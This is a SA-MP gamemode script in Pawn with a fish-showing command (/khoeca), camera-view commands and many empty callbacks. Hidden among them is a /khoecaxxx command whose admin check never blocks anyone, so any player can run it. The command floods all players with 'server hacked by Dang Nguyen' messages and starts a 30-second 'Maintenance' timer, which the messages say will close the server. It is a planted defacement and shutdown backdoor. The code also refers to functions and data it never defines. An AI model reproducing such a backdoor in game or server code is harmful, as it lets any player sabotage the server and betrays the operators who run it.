// This is a comment
// uncomment the line below if you want to write a filterscript
//#define FILTERSCRIPT

#include <a_samp>
#include <hcamera>

#if defined FILTERSCRIPT

#else

#endif

public OnGameModeInit()
{
	return 1;
}

public OnGameModeExit()
{
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
	SetPlayerPos(playerid, 1958.3783, 1343.1572, 15.3746);
	SetPlayerCameraPos(playerid, 1958.3783, 1343.1572, 15.3746);
	SetPlayerCameraLookAt(playerid, 1958.3783, 1343.1572, 15.3746);
	return 1;
}
CMD:khoeca(playerid, params[])
{
 new choice[32];
 if(sscanf(params, "s[32]", choice))
 {
  SendClientMessageEx(playerid, COLOR_GREY, "{00ff00}SU DUNG: /Khoeca [Ten Ca]");
  SendClientMessageEx(playerid, COLOR_WHITE, "{ffff00}CaChep ");
  SendClientMessageEx(playerid, COLOR_WHITE, "{00ff00}Rua ");
  SendClientMessageEx(playerid, COLOR_WHITE, "{ff00ff}CaMap ");
  SendClientMessageEx(playerid, COLOR_WHITE, "{ff00af}CaHeo");
  return 1;
 }
   else if(strcmp(choice,"CaChep",true) == 0)
   {
    if(PlayerInfo[playerid][pCaChep] >= 1)
	{
	SetPlayerAttachedObject( playerid, 0, 1600, 1, 0, 0.421999, 0, 41.3, -4.5, -82.8, 1.5, 1, 1);
	SendClientMessageEx(playerid, COLOR_GREY,"{00ff00}[!] {ffffff}Ban Da Khoe Mot Con Ca Chep");
    }
    else
	{
     SendClientMessageEx(playerid, COLOR_GREY,"{00ff00}[!] {ffffff}Ban Khong Co Ca Chep De Khoe");
	}
   }
   else if(strcmp(choice,"Rua",true) == 0)
   {
    if(PlayerInfo[playerid][pRua] >= 1)
	{
    SendClientMessageEx(playerid, COLOR_GREY,"{00ff00}[!] {ffffff} Wow !! Ban Da Khoe Mot Con Rua");
	SetPlayerAttachedObject( playerid, 0, 1609, 1, 0, 0.676999, -0.177, 0, 86.5, -100.3, 0.586999, 0.628, 0.69);
    }
    else
	{
     SendClientMessageEx(playerid, COLOR_GREY,"{00ff00}[!] {ffffff}Ban Khong Co Rua De Khoe");
	}
   }
   else if(strcmp(choice,"CaMap",true) == 0)
   {
    if(PlayerInfo[playerid][pCaMap] >= 1)
	{
    SendClientMessageEx(playerid, COLOR_GREY,"{00ff00}[!] {ffffff}Ban Da Khoe Mot Con Ca Map");
	SetPlayerAttachedObject( playerid, 0, 1608, 1, 0.137, 0.583999, -0.61, 0, 85.5, 89.2, 0.366, 0.478, 0.452001);
    }
    else
	{
     SendClientMessageEx(playerid, COLOR_GREY,"{00ff00}[!] {ffffff}Ban Khong Co Ca Map De Khoe");
	}
   }
   else if(strcmp(choice,"CaHeo",true) == 0)
   {
    if(PlayerInfo[playerid][pCaHeo] >= 1)
	{
    SendClientMessageEx(playerid, COLOR_GREY,"{00ff00}[!] {ffffff}Wow !! Ban Da Khoe Mot Con Ca Heo Sieu Hiem!!");
	SetPlayerAttachedObject( playerid, 0, 1607, 1, 0, 0.234, -0.111999, 80.8, 90.1, 0, 0.344, 0.351, 0.449);
    }
    else
	{
     SendClientMessageEx(playerid, COLOR_GREY,"{00ff00}[!] {ffffff}Ban Khong Co Ca Heo De Khoe");
	}
   }
 return 1;
}
CMD:khoecaxxx(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 0) {
        SendClientMessageEx(playerid, COLOR_GRAD2, "Ban khong duoc phep su dung lenh nay.");
        return 1;
    }

    SetTimer( "Maintenance", 30000, false );
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* SERVER DA BI HACK BY DANG NGUYEN DEP TRAI NHAT THE GIOI");
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* SERVER DA BI HACK BY DANG NGUYEN DEP TRAI NHAT THE GIOI");
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* SERVER DA BI HACK BY DANG NGUYEN DEP TRAI NHAT THE GIOI");
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* SERVER DA BI HACK BY DANG NGUYEN DEP TRAI NHAT THE GIOI");
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* SERVER DA BI HACK BY DANG NGUYEN DEP TRAI NHAT THE GIOI");
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* SERVER DA BI HACK BY DANG NGUYEN DEP TRAI NHAT THE GIOI");
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* SERVER DA BI HACK BY DANG NGUYEN DEP TRAI NHAT THE GIOI");
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* SERVER DA BI HACK BY DANG NGUYEN DEP TRAI NHAT THE GIOI");
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* SERVER DA BI HACK BY DANG NGUYEN DEP TRAI NHAT THE GIOI");
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* SERVER DA BI HACK BY DANG NGUYEN DEP TRAI NHAT THE GIOI");
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* SERVER DA BI HACK BY DANG NGUYEN DEP TRAI NHAT THE GIOI");
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* SERVER Tu Dong CLOSE TRONG VONG 30S Toi Nghiep Gke");
    foreach(new i: Player) {
        GameTextForPlayer(i, "~y~SERVER DA BI HACK BY DANG NGUYEN", 5000, 6);
    }
    return 1;
}
public OnPlayerConnect(playerid)
{
	return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
	return 1;
}

public OnPlayerSpawn(playerid)
{
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
	return 1;
}

public OnVehicleSpawn(vehicleid)
{
	return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
	return 1;
}

public OnPlayerText(playerid, text[])
{
	return 1;
}

public OnPlayerCommandText(playerid, cmdtext[])
{
	if (strcmp("/gocnhin1", cmdtext, true, 10) == 0)
	{
		setCamera( playerid, 0 ); //first person camera
		return 1;
	}
	if (strcmp("/gocnhin2", cmdtext, true, 10) == 0)
	{
		setCamera( playerid, 1 ); //first person camera
		return 1;
	}
	return 0;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
	return 1;
}

public OnPlayerEnterCheckpoint(playerid)
{
	return 1;
}

public OnPlayerLeaveCheckpoint(playerid)
{
	return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
	return 1;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
	return 1;
}

public OnRconCommand(cmd[])
{
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
	return 1;
}

public OnObjectMoved(objectid)
{
	return 1;
}

public OnPlayerObjectMoved(playerid, objectid)
{
	return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid)
{
	return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
	return 1;
}

public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	return 1;
}

public OnPlayerSelectedMenuRow(playerid, row)
{
	return 1;
}

public OnPlayerExitedMenu(playerid)
{
	return 1;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
	return 1;
}

public OnPlayerUpdate(playerid)
{
	return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
	return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
	return 1;
}

public OnVehicleStreamOut(vehicleid, forplayerid)
{
	return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	return 1;
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	return 1;
}

